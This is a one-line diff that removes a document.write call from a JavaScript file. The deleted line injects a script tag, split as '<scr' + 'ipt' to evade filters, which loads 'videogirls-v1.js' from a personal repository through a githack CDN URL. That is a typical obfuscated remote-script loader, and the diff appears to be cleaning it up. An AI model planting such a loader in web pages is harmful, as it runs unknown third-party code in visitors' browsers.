@@ -1,1 +1,0 @@
-document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/81ed9b4cbce80dcaa55dabe890b487ff85bc2272/videogirls-v1.js"></scr' + 'ipt>');
